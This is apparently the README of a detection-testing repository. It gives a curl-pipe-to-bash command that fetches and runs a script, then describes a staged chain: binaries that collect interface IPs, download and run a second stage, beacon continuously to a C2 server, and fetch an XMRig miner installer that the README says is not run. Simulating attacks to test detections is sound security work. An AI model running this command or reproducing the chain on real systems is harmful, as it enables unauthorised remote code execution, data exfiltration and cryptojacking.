# detection-testing

lw-det-test.sh
--------------
Run this script to start the whole process:

  curl https://raw.githubusercontent.com/sporcello7/detection-testing/main/lw-det-test.sh | bash

This script will:
  1. Download the lw-binary first stage binary
  2. Change permissions to lw-binary so it can be executed
  3. Execute lw-binary in the background


lw-binary
---------------
This binary will:
  1. Collect IP information about intefaces
  2. Download lw-binary-2 as a second stage binary
  3. Change permissions to lw-binary-2 so it can be executed
  4. Execute lw-binary-2
  5. Coninuously beacon to the C2 server (payload is the IP information collected in step 1)


lw-binary-2
--------------
This binary will:
  1. Download install-demo-1.sh bash script, which can be used to install an XMRig coin miner
     (It will NOT execute the coinminer script)
